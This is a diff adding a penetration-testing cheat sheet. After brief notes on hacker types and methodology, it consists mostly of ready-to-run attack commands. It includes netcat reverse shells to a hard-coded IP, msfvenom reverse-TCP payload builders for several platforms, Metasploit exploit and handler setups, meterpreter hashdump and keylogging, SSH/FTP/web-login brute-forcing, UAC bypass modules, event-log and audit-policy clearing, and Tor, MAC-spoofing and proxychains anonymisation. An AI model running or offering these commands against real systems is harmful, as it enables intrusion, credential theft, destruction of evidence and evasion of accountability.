@@ -1,0 +1,343 @@
+* Different Type Of Hackers : 
+-> White Hat Hackers
+-> Black Hat Hackers
+-> Grey Hat Hackers
+-> Script Kiddies
+-> Hacktivists
+-> State-Sponsored Hackers
+
+* Testing Approaching
+-> White Box Testing == Full Knowledge of Code == Internal Structure and Logic == Using and Integrating testing
+-> Black Box Testing == No Knowledge of Code == Functionality and User experience == System and acceptance Testing
+-> Grey Box Testing == Partial Knowledge == Both Internal and external Aspects == Integration and System testing
+
+* 3 Team:
+-> Red Team == Offensive Security == Simulating attacks, Penetration Testing == Identifing Vulnerabilities
+-> Blue Team == Defensive Security == Monitor Systems, Incident Response == Protect against Attacks
+-> Purple Team == Collaboration between Red and Blue == Join exercises, knowledge sharing == Strengthen Overall security Posture
+
+* Ethical Hacking Methodolgy: Recon/FootPrinting -> Scanning -> Ganing Access -> Maintaining Access -> Cleaning Tracks
+
+Recon == Gathering Information about the target == dorking, whois, DNS Enum, Social Eng
+Scanning == Using tools identify bulnerabilities in the target == Network mapping, Port Scanning, Vulnerability Scanning
+Gaining Access == Attemping Exploit identified Vulnerabilities == SQLI, Buffer Overflow, Phishing
+Maintaining Access == Establishing a persistent connection == Installing rootkits/Backdoor, Creating hidden user accounts
+Clearing Records == Removing Traces of the ethical hackers activities == Modifying logs files, Deleting evidence etc
+
+Recon -> Weaponization -> Delivery -> Exxploitation -> Installation -> Command and Control -> Action and Objective
+
+* Google dorking: 
+
+-> site: | filetype: | inurl: | intitle: | allintitle: | intext: 
+
+Dorking Github:
+https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06
+https://github.com/chr3st5an/Google-Dorking
+https://github.com/Proviesec/google-dorks
+
+Helper:
+https://dorks.s1rn3tz.ovh/
+https://freelancermijan.github.io/reconengine/
+https://0xpoyel.github.io/Search-Engine-For-Web-Pen-testing-and-Bug-Hunting/
+
+* DNS Recon: Whois + dig + dnsrecon + nslookup + host + dnsenum
+
+whois example.com
+whois 8.8.8.8
+
+dig example.com
+dig example.com A
+dig example.com MX
+dig example.com TXT
+dig example.com NS
+dig example.com CNAME
+dig example.com ANY
+
+dnsrecon -d example.com
+dnsrecon -d example.com -t axfr
+dnsrecon -r 192.168.1.0/24
+
+nslookup example.com
+nslookup example.com 8.8.8.8
+nslookup -query=MX example.com
+nslookup -query=NS example.com
+nslookup -query=A example.com
+
+host example.com
+host -t MX example.com
+host -t NS example.com
+host -t TXT example.com
+host -a example.com
+
+dnsenum example.com
+dnsenum --enum example.com
+
+Social Media Osint : 
+site:linkedin.com/in working at "east west university"
+site:facebook.com working at "east west university"
+site:x.com working at "east west university"
+
+python3 sherlock <username>
+python3 sherlock johndoe
+python3 sherlock johndoe --output johndoe.txt 
+
+Identifying Website Technique:wappalyzer, buildwith, whatweb
+
+Subdomain Enum :
+
+subfinder -d google.com
+amass enum -d example.com
+assetfinder --subs-only example.com
+curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
+dnsrecon -d example.com -t brt
+findomain -t example.com
+knockpy example.com
+theHarvester -d example.com -b all
+python3 sublist3r.py -d example.com
+dnsenum --enum example.com
+nslookup -type=NS example.com
+
+amass enum -passive -d example.com
+subfinder -d example.com | tee passive_subs.txt
+assetfinder --subs-only example.com | tee -a passive_subs.txt
+amass enum -passive -d example.com | tee -a passive_subs.txt
+sort -u passive_subs.txt -o passive_final.txt
+curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
+
+amass enum -brute -w /usr/share/wordlists/dns/best-dns-wordlist.txt -d example.com
+dnsrecon -d example.com -D /usr/share/wordlists/dns/best-dns-wordlist.txt -t brt
+massdns -r resolvers.txt -t A -o S -w output.txt subdomains.txt
+
+subfinder -d example.com | tee subfinder.txt
+amass enum -d example.com | tee amass.txt
+assetfinder --subs-only example.com | tee assetfinder.txt
+curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | tee crtsh.txt
+cat subfinder.txt amass.txt assetfinder.txt crtsh.txt | sort -u > all_subs.txt
+
+cat all_subs.txt | httprobe | tee live_subs.txt
+cat all_subs.txt | httpx -title -tech-detect -status-code -o httpx_results.txt
+nmap -sV -p 80,443,8080 -iL live_subs.txt -oA nmap_scan
+
+cat all_subs.txt | dnsx -silent -o clean_subs.txt
+waybackurls example.com | grep -Eo "https?://[a-zA-Z0-9./?=_%:-]*" | tee wayback.txt
+subfinder -d example.com | dnsx -cname -o cname_records.txt
+
+Always use httpx and dnsx to validate live subdomains. amass, subfinder, and assetfinder together provide the best results
+
+WAF Detection : 
+
+wafw00f site.com
+nmap -p 80,443 --script http-waf-detect example.com
+nmap -p 80,443 --script http-waf-fingerprint example.com
+
+curl -I https://example.com
+curl -H "X-Originating-IP: 127.0.0.1" https://example.com
+
+traceroute example.com
+traceroute -T -p 443 example.com
+
+hping3 -1 -c 4 example.com
+hping3 -S -p 80 example.com
+hping3 --udp -p 53 example.com
+
+Network Scanning:
+
+nmap -sA -p- example.comnmap -sS -Pn -p- --reason example.com
+nmap -sS -Pn -p- --reason example.com
+nmap -p 80,443 --script http-waf-detect example.com
+nmap -p 80,443 --script http-waf-fingerprint example.com
+nmap -sS -f -p 80,443 example.com
+
+nmap -p 1-1000 example.com
+nmap -A example.com
+nmap -T5 example.com
+nmap -sS -f example.com
+
+smap example.com
+smap -p 80,443,8080 example.com
+smap -sV example.com
+
+rustscan example.com 
+rustscan -a example.com --ulimit 5000
+rustscan -a example.com -- -A -sV
+
+masscan -p1-65535 --rate 100000 example.com
+masscan -p80,443 example.com -oX output.xml
+
+naabu -host example.com
+naabu -host example.com -p 80,443
+
+nmap -A -p- example.com
+smap -sV example.com
+rustscan -a example.com
+masscan -p1-65535 example.com
+naabu -host example.com
+
+Directory BruteForce:
+
+dirsearch -u https://example.com -e php,html,txt
+dirsearch -u https://example.com -t 50
+dirsearch -u https://example.com -w /path/to/wordlist.txt
+dirsearch -u https://example.com -H "User-Agent: Googlebot"
+
+gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt --proxy http://127.0.0.1:8080
+
+ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
+ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt
+ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 100
+
+dirb https://example.com
+dirb https://example.com /usr/share/wordlists/dirb/big.txt
+
+feroxbuster -u https://example.com
+feroxbuster -u https://example.com -r
+feroxbuster -u https://example.com -H "Authorization: Bearer TOKEN"
+
+Vulnerability Scanning:
+
+sudo systemctl start nessusd.service
+sudo systemctl status nessusd.service
+
+Finding Exploit:
+searchsploit apache
+
+msfconsole
+search type:exploit name:apache
+
+nc -nvlp 4444 -c /bin/bash ==>> nc -v 127.0.0.1 4444
+nc 192.168.29.168 4444 -c /bin/bash ==>> nc -lvnp 4444
+
+msfvenom -l payloads | grep "windows/meterpreter/reverse_tcp"
+msfvenom -l payloads | grep "meterpreter_reverse_tcp"
+
+Server-Side Exploitation (Targeting Remote Services):
+
+msfconsole
+search type:exploit name:apache
+search cve:2023-23397
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS target.com
+set LHOST your_ip
+set PAYLOAD cmd/unix/interact
+exploit
+
+use exploit/multi/http/tomcat_mgr_upload
+set RHOSTS target.com
+set USERNAME admin
+set PASSWORD password
+set LHOST your_ip
+set PAYLOAD java/meterpreter/reverse_tcp
+exploit
+
+Client-Side Exploitation (Social Engineering Attacks):
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe > payload.exe
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f elf > payload.elf
+msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -o payload.apk
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your IP> LPORT=<your port> -f exe -o filename.exe
+msfvenom -p linux/meterpreter/reverse_tcp LHOST=<your IP> LPORT=<your port> -f elf -o filename.elf
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<your IP> LPORT=<your port> -f raw -o filename.php
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<your IP> LPORT=<your port> -f apk -o filename.apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.169.128 LPORT=4444 R > result.apk
+
+python3 -m http.server
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST your_ip
+set LPORT 4444
+exploit
+
+sysinfo - ps - shell - hashdump - keyscan_start - keyscan_dump
+
+BruteForce:
+
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
+medusa -h 192.168.1.100 -u root -P /usr/share/wordlists/rockyou.txt -M ssh
+nmap --script ssh-brute -p 22 192.168.1.100 --script-args userdb=/usr/share/wordlists/usernames.txt,passdb=/usr/share/wordlists/rockyou.txt
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100
+medusa -h 192.168.1.100 -u admin -P /usr/share/wordlists/rockyou.txt -M ftp
+nmap --script ftp-brute -p 21 192.168.1.100
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
+
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt secret.zip
+
+rarcrack --type rar --dictionary /usr/share/wordlists/rockyou.txt secret.rar
+pdfcrack -f secret.pdf -w /usr/share/wordlists/rockyou.txt
+
+UAC Bypass:
+
+getuid
+getprivs
+
+sessions -i
+sessions -i 1
+
+use exploit/windows/local/bypassuac
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+exploit
+
+use exploit/windows/local/bypassuac_fodhelper
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+exploit
+
+use exploit/windows/local/bypassuac_eventvwr
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+exploit
+
+getuid
+whoami
+run event_manager -i
+clearev
+run event_manager -i
+execute -f cmd.exe -a "/c auditpol /clear"
+
+Staying Anonymous:
+
+sudo apt update && sudo apt install tor -y
+sudo systemctl start tor
+
+sudo apt install macchanger -y
+sudo ifconfig wlan0 down
+sudo macchanger -r wlan0
+sudo ifconfig wlan0 up
+
+sudo macchanger -r wlan0
+sudo macchanger -r eth0
+
+sudo macchanger --mac=00:11:22:33:44:55 wlan0
+
+proxychains
+cd /etc/
+sudo nano /etc/proxychains4.conf >>>>> socks5 127.0.0.1 9050
+proxychains4 firefox
+proxychains4 nmap -sS -Pn target.com
+proxychains4 nmap -p 22 -sV target.com
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
